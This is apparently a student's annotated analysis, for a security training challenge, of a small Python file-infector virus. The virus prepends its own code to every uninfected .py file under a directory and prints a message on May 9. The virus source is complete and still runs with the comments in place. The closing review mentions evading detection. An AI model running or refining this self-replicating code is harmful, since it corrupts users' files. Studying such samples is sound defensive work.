#!/usr/bin/python3

# Author: Justin Patterson
# Date last revised: 04/15/2024
# Ops Challenge #: Seattle-Ops-301w10 Ops Challenge 14
# Purpose: Python malware script analysis
# Script Name: malware_analysis_301w10.py

###All lines with '###' are part of the script analysis and not the script itself

###Importing modules
import os
import datetime

###Defines a constant variable SIGNATURE with value "VIRUS"
SIGNATURE = "VIRUS" 

###Function to recursively search for Python files in a directory
def locate(path):
    ###List to store targeted files
    files_targeted = []
    ###Gets list fo files/directories in the specified path
    filelist = os.listdir(path)
    ###Iterates through each file/directory
    for fname in filelist:
        ###If it's a directory, recursively call locate function
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
            ###If it's a Python file
        elif fname[-3:] == ".py":
            infected = False
            ###Opens the file and checks if SIGNATURE exists in any line
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
                ###If file is not infected, adds it to the list
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted

###Funtion to infect targeted files with the virus
def infect(files_targeted):
    ###Opens the script file itself
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    ###Reads the first 39 lines of the script and store them as virusstrings
    for i,line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    virus.close
    ###Iterates through each targeted file
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

###Function to detonate the virus if it's May 9/print "you have been hacked"
def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")

###Locates Python files in the currint directory and its subdirectories
files_targeted = locate(os.path.abspath(""))
###Infect targeted files with the virus
infect(files_targeted)
###detonate the virus if it is May 9
detonate()

###STRETCH GOAL###

###Core Python/coding tools used:
    #Functions
    #File I/O operations (reading,writing)
    #OS module for directory operations
    #Datetime module for getting the current date

###Types of malware:
    #Basic Python file-infector virus. It searches for files, infects them, and triggers the execustion of a payload.

###Code quality:
    #The code achieves the objective
    #Needs better techniques to avoid detection
    #Could have written the code to check file permissions before trying to open them.


